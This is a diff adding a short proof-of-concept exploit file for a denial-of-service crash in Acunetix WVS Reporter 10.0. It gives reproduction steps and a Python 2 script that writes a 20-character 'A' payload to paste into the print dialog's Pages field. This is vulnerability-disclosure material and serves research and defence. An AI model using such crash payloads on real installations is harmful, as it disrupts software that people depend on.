@@ -1,0 +1,27 @@
+# Exploit Title: Acunetix WVS Reporter 10.0 - Denial of Service (PoC)
+# Exploit Author: Ali Alipour
+# Date: 2018-08-22
+# Vendor Homepage : https://www.acunetix.com/
+# Tested on : Windows 10 - 64-bit
+
+# Steps to Reproduce
+# Run the python exploit script, it will create a new 
+# file with the name "exploit.txt" just copy the text inside "exploit.txt"
+# and start the Acunetix WVS Reporter 10.0 program. 
+# In the new window click "Report Preview" > "Load Report". 
+# And upload a sample report >> Then click on the print button .
+# Now Paste the content of "exploit.txt" into the field: " Pages ". 
+# Click "OK" and you will see a Crash.
+
+#!/usr/bin/python
+    
+buffer = "A" * 20
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
